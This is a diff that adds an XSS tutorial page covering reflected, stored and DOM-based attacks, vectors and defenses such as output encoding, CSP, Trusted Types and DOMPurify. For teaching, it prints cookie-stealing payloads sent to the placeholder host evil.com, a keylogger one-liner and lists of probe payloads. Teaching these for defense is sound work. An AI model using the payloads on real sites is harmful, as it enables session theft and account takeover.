@@ -1,0 +1,322 @@
+# Cross-Site Scripting (XSS)
+
+XSS is the most common web vulnerability in history — it appears in roughly two-thirds of all web applications. The idea: **an attacker injects malicious JavaScript into a page viewed by another user.** The victim's browser executes it as if it came from the trusted site.
+
+If an attacker can run JavaScript in your user's browser on your domain, they can do anything your JavaScript can do: steal cookies, capture keystrokes, rewrite the page, make requests as the user, or install service workers for persistence.
+
+<Callout kind="insight">
+**XSS is fundamentally an output-encoding problem.** The browser doesn't care what your input filter did — it cares what the DOM sees. Encode contextually at every sink (HTML, attribute, JS, URL, CSS), use framework auto-escaping, and layer a nonce-based CSP so even a missed encoding is downgraded from execution to refusal.
+</Callout>
+
+---
+
+## How It Works
+
+The root cause is always the same: **untrusted data reaches the DOM through a dangerous sink.**
+
+Consider a search page that echoes the query:
+
+```html
+<h1>Search results for: <?php echo $_GET['q']; ?></h1>
+```
+
+A normal user searches `kittens` — the page shows:
+
+```html
+<h1>Search results for: kittens</h1>
+```
+
+An attacker sends the victim a link to:
+
+```
+/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+```
+
+The page now shows:
+
+```html
+<h1>Search results for: <script>fetch('https://evil.com/steal?c='+document.cookie)</script></h1>
+```
+
+The browser parses the `<script>` tag and executes it. The attacker just stole the victim's session cookie — **account takeover in one link.**
+
+---
+
+## Three Types of XSS
+
+### 1. Reflected XSS
+
+The payload is in the request (URL parameter, form input) and reflected immediately in the response.
+
+**Flow:**
+```
+Attacker crafts URL → sends to victim → victim clicks → 
+server echoes payload in response → browser executes it
+```
+
+**Typical sinks:** Search results, error messages, "welcome back" banners, any page that echoes query parameters.
+
+**Example URL:**
+```
+https://app.example.com/search?q=<img src=x onerror=alert(1)>
+```
+
+The `<img>` tag fails to load `x`, triggering `onerror`, which executes `alert(1)`. No `<script>` tag needed — almost any HTML element with an event handler works.
+
+**Why it's called "reflected":** The payload bounces off the server and back to the victim. It never touches the database. Each victim must click the attacker's crafted link.
+
+---
+
+### 2. Stored XSS
+
+The payload is stored on the server (database, file, cache) and served to every user who views the affected page. This is the most dangerous form — **one payload, unlimited victims.**
+
+**Flow:**
+```
+Attacker submits payload → server stores it → 
+any user views the page → payload executes in their browser
+```
+
+**Typical sinks:** Comment sections, user profiles, forum posts, chat messages, document titles — anything that accepts user content and displays it to others.
+
+**Example:** A comment form:
+
+```html
+<textarea name="comment"></textarea>
+```
+
+The attacker submits:
+
+```html
+Nice article! <script>new Image().src='https://evil.com/log?c='+document.cookie</script>
+```
+
+Now every user who reads the comments has their cookie exfiltrated. No clicking required — **the page does the work.**
+
+**Why it's dangerous:** Stored XSS can spread virally. One malicious comment on a popular forum can compromise thousands of users before anyone notices.
+
+---
+
+### 3. DOM-Based XSS
+
+The payload never reaches the server. The vulnerability is entirely in client-side JavaScript: **the page reads input from the browser (URL fragment, `document.referrer`, `window.name`) and writes it to the DOM unsafely.**
+
+**Flow:**
+```
+Attacker crafts URL → victim clicks → 
+client-side JS reads the payload from the URL → writes it to innerHTML → executes
+```
+
+**The server sends clean HTML.** The injection happens entirely in the browser.
+
+**Vulnerable code:**
+```javascript
+// Reads from URL hash, writes unsafely to DOM
+const lang = location.hash.slice(1);
+document.getElementById('greeting').innerHTML = `Language: ${lang}`;
+```
+
+**Attack URL:**
+```
+https://app.example.com/page#<img src=x onerror=alert(1)>
+```
+
+The server never sees the payload — it's in the URL fragment, which browsers don't send to servers. But `location.hash` is available to JavaScript, and `innerHTML` parses it as HTML.
+
+**Why it's tricky to find:** Server-side scanners see clean traffic. You must review client-side JavaScript to find DOM-based XSS. The sink (`innerHTML`, `document.write`, `eval`, `setTimeout(string)`) and the source (`location.hash`, `document.referrer`, `window.name`) are both in the browser.
+
+---
+
+## Common XSS Vectors
+
+Attackers don't need `<script>` tags. Any HTML element that can execute JavaScript is a vector:
+
+| Payload | Mechanism |
+|---------|-----------|
+| `<script>alert(1)</script>` | Direct script execution |
+| `<img src=x onerror=alert(1)>` | Image load failure fires onerror |
+| `<svg onload=alert(1)>` | SVG load event |
+| `<body onload=alert(1)>` | Body load event |
+| `<a href="javascript:alert(1)">click</a>` | JavaScript pseudo-protocol |
+| `<iframe src="javascript:alert(1)">` | JavaScript iframe src |
+| `<div onmouseover="alert(1)">hover</div>` | Mouse event handler |
+| `<input autofocus onfocus=alert(1)>` | Autofocus triggers onfocus |
+
+**The rule:** if user input can break out of a data context into a code context, XSS is possible. There are hundreds of known vectors.
+
+---
+
+## Impact Beyond Cookie Theft
+
+Cookie theft gets the headlines, but XSS can do much more:
+
+- **Keylogging:** `document.onkeydown = e => fetch('/log?k='+e.key)` — captures every keystroke on the page, including passwords and credit card numbers.
+- **Page rewriting:** `document.body.innerHTML = '<h1>Hacked</h1>'` — defacement or phishing. The victim sees your domain but the attacker's content.
+- **Request forgery:** The injected script can make authenticated requests as the victim — transfer money, change email, delete data. CSRF tokens are readable by injected scripts.
+- **Port scanning:** Scripts can make requests to internal IPs, mapping the victim's local network.
+- **Service worker installation:** A script can register a service worker, giving the attacker persistent control over all requests from that origin.
+- **Browser exploitation:** In rare cases, XSS can chain with browser vulnerabilities for code execution outside the sandbox.
+
+---
+
+## Defenses
+
+### 1. Output Encoding (Context-Aware)
+
+The most fundamental defense: **encode data when you write it to the page, using the correct encoding for the context.**
+
+**Wrong (no encoding):**
+```javascript
+element.innerHTML = `<h1>Welcome, ${username}</h1>`;
+```
+
+If `username` is `<img src=x onerror=alert(1)>`, it executes.
+
+**Safe (HTML encoding):**
+```javascript
+element.textContent = `Welcome, ${username}`;
+```
+
+`textContent` sets text, never HTML. The `<img>` tag is displayed as literal text.
+
+**Context matters — five different encodings:**
+
+| Context | Example | Encoding |
+|---------|---------|----------|
+| HTML body | `<div>${data}</div>` | HTML-encode: `<` → `&lt;` |
+| HTML attribute | `<input value="${data}">` | HTML-attribute-encode: also escape quotes |
+| JavaScript | `<script>var x='${data}'</script>` | JS-encode: `'` → `\x27`, `\n` → `\\n` |
+| CSS | `<style>body{color:${data}}</style>` | CSS-encode |
+| URL | `<a href="${data}">` | URL-encode + validate protocol |
+
+**Using the wrong encoding is as bad as no encoding.** HTML-encoding is not enough inside a `<script>` block — `\x27` breaks out of the JS string even if `<` is encoded.
+
+### 2. Content Security Policy (CSP)
+
+CSP is a defense-in-depth layer. It tells the browser which sources of JavaScript are allowed.
+
+```http
+Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
+```
+
+This policy:
+- Allows scripts only from the same origin (`'self'`)
+- Blocks `<object>`, `<embed>`, `<applet>` entirely
+- Prevents `<base>` tag injection
+
+**With CSP, even if an attacker injects a `<script>` tag, the browser refuses to execute it** — unless the script source is in the allowlist.
+
+**Best practices:**
+- Never use `'unsafe-inline'` — it allows inline `<script>` tags, defeating CSP's main purpose.
+- Never use `'unsafe-eval'` — it allows `eval()`, which is a common XSS sink.
+- Use **nonces** or **hashes** for legitimate inline scripts instead of `'unsafe-inline'`:
+  ```html
+  <script nonce="random123">...</script>
+  ```
+  ```http
+  Content-Security-Policy: script-src 'nonce-random123'
+  ```
+
+**CSP is not a substitute for output encoding.** It's a safety net — if you forget to encode one variable, CSP may stop the script from executing. But CSP can be bypassed, and old browsers don't support it.
+
+### 3. Trusted Types
+
+A newer browser API that makes DOM XSS impossible by default. Trusted Types require that dangerous sinks (`innerHTML`, `document.write`) only accept `TrustedHTML` objects, not raw strings.
+
+```javascript
+// Without Trusted Types — vulnerable
+element.innerHTML = userInput;
+
+// With Trusted Types enforced — this throws a TypeError
+element.innerHTML = userInput; // ❌
+
+// You must use a Trusted Types policy
+const policy = trustedTypes.createPolicy('default', {
+  createHTML: (input) => DOMPurify.sanitize(input)
+});
+element.innerHTML = policy.createHTML(userInput); // ✅
+```
+
+**Trusted Types are enforced via CSP:**
+
+```http
+Content-Security-Policy: require-trusted-types-for 'script'
+```
+
+### 4. DOM Purify (HTML Sanitization)
+
+When you must render user-supplied HTML (e.g., rich text, Markdown), use a sanitizer. **DOMPurify** is the standard:
+
+```javascript
+import DOMPurify from 'dompurify';
+
+// Safe: removes scripts, event handlers, dangerous elements
+const clean = DOMPurify.sanitize(userHtml);
+element.innerHTML = clean;
+```
+
+DOMPurify parses the HTML and removes anything dangerous: `<script>` tags, event handlers (`onerror`, `onclick`), JavaScript URLs, and hundreds of other known vectors. It works in the browser — it uses the DOM parser to understand the HTML structurally, not through regex.
+
+**Never write your own sanitizer.** The spec is enormous and attackers have decades of bypass tricks.
+
+### 5. httpOnly Cookies
+
+Session cookies should be marked `httpOnly`:
+
+```http
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
+```
+
+`HttpOnly` means JavaScript cannot read the cookie (`document.cookie` won't show it). If an attacker achieves XSS, they can't steal the session token. They can still make requests as the user (the browser sends cookies automatically), but they can't exfiltrate the token for offline use.
+
+### 6. Framework-Level Protections
+
+Modern frameworks provide automatic XSS protection:
+
+- **React:** JSX auto-escapes all expressions by default. `{userInput}` is HTML-encoded. To render raw HTML, you must explicitly use `dangerouslySetInnerHTML` — the name is a warning.
+- **Vue:** `{{ expression }}` auto-escapes. `v-html` is the explicit dangerous path.
+- **Angular:** Template interpolation auto-escapes. `[innerHTML]` is the dangerous path.
+
+**Important:** Framework protection only applies to expressions in templates. If you use `dangerouslySetInnerHTML`, `v-html`, or `[innerHTML]` with user input, you've bypassed the framework's protection.
+
+---
+
+## Testing for XSS
+
+**Manual probes — payloads to try:**
+
+- `<script>alert(1)</script>` — classic probe
+- `<img src=x onerror=alert(1)>` — works without `<script>` tag
+- `"><script>alert(1)</script>` — breaks out of HTML attribute
+- `'-alert(1)-'` — breaks out of JavaScript string
+- `javascript:alert(1)` — tests URL context
+- `<svg/onload=alert(1)>` — works without closing tag
+
+**Automated tools:**
+- **Burp Suite Scanner:** Active scanning identifies reflected and stored XSS.
+- **DOM Invader (Burp):** Instruments the page to find DOM-based XSS sources and sinks.
+- **XSStrike:** XSS-specific scanner with context analysis and WAF bypass generation.
+
+---
+
+## Summary
+
+| Principle | Practice |
+|-----------|----------|
+| **Primary defense** | Context-aware output encoding — encode for HTML, JS, CSS, URL |
+| **Never** | Use `innerHTML`, `document.write`, or `eval` with untrusted data |
+| **Safe alternatives** | `textContent` for text; DOMPurify for HTML |
+| **Framework defaults** | React's JSX, Vue's `{{ }}`, Angular's interpolation — all auto-escape |
+| **CSP** | `script-src 'self'` with nonces. Never `'unsafe-inline'` |
+| **Cookies** | `HttpOnly` on session tokens |
+| **Layer it** | Encoding + CSP + Trusted Types + httpOnly = attacker needs to beat all four |
+
+XSS is a data-boundary problem: data that should be text becomes code because it enters a parser (HTML parser, CSS parser, JS engine) in the wrong position. **Encode at the boundary, validate early, sanitize if you must render HTML.**
+
+---
+
+## Misconception
+
+**Myth:** "Input validation prevents XSS."
+
+**Reality:** Input validation is a secondary defense at best. An attacker can craft a perfectly valid input (a real name like `O'Brien`, a valid email, a URL) that contains characters which become dangerous only at the point of output — depending on context. A single quote in a name is valid input but dangerous inside a JavaScript string literal. The correct defense is output encoding, not input filtering. Validate input for business rules; encode output for security.
